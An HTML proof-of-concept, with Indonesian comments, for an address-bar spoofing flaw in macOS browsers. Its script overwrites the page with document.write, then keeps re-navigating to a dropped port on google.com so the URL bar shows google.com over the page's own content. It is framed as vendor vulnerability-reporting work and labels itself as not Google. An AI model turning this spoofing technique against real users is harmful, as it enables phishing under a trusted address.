<!-- 01 - dead-port, tab yang sama   [address-bar spoofing | macOS: Dia/Arc/Chrome/Brave/Edge macOS]
     MEKANISME : document.write mengecat dokumen ini, lalu navigasi ke port yang DI-DROP; interval 9800ms meng-arm ulang pending sebelum error page sempat commit.
     PREDIKAT  : bilah URL menulis https://www.google.com sementara isi layar adalah tulisan origin ini.
     AMAN      : bilah tetap di origin asli sampai ada COMMIT.
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>01 dead-port, tab yang sama</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
var T='https://www.google.com:9090/';o.textContent='REAL: '+location.origin;
function go(){document.write('<h2>BUKAN google.com - '+location.origin+'</h2>');location=T;setInterval(function(){location=T;},9800);}
</script>
